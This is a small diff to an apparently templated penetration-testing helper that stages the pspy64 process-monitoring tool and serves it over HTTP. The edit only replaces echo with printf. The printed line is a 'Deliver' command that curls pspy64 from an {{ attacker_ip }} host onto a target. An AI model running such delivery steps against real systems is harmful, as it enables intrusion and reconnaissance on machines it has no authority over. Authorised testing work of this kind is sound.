@@ -7,8 +7,8 @@ metadata:
 
 content: |
   mkdir -p packstation/outbound; cp -n {{ tools_dir }}/pspy/pspy64 packstation/outbound/; \
-  echo '================================================================'; \
-  echo '                       -----Linux------                         '; \
-  echo 'Deliver: curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/pspy64 -o {{ delivery_path_linux }}/pspy64'; \
-  echo '================================================================'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                       -----Linux------                         '; \
+  printf '%s\n' 'Deliver: curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/pspy64 -o {{ delivery_path_linux }}/pspy64'; \
+  printf '%s\n' '================================================================'; \
   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
